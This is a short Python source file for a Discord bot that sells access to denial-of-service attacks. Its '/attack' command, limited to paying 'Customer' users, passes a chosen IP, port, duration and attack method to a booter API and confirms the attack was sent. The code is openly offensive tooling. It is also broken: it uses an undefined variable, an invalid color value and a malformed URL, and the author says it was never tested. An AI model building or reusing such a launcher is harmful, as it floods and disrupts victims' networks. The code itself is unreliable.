import discord
from discord.ext import commands
import os
import requests
import math
import asyncio
import aiohttp
## Command Prefix
client = commands.Bot(command_prefix='/')

## How it works (default layout)
# /attack ip port time method

client.remove_command("help")

@client.event
async def on_ready():
  await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="TBN BABEEE"))
  print("Bot loaded")
  
  
@client.command()
@commands.has_any_role('Customer')
@commands.cooldown(1, 120, commands.BucketType.user)
async def attack(ctx, arg1, arg2, arg3: int, arg4):
    channel = client.get_channel(PutChannelIDHere)
    if channel == ctx.channel:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"testkey.xyz&ip={arg1}&port={arg2}&time={arg3}&method={arg4}") as r:
                    b = await r.text()
                    print(b)
                    message = await ctx.send("**Sending attack cutie**")
                    embed1 = discord.Embed(title=f'sent the power!', color=discord.Color.from_rgb(265, 0, 0))
                    await ctx.send(embed=embed1)
        except:
            await ctx.send("Missing key?")
            
            
client.run("tokenhere")

## IF THIS BOT DOES NOT WORK TRY FIND ISSUE.. I HAVE NOT TESTED THIS BOT ONCE SO GOODLUCK, THIS IS THE BASIC AF BOT.
## I will add HELP List if you contact me on discord: inactive#9049.
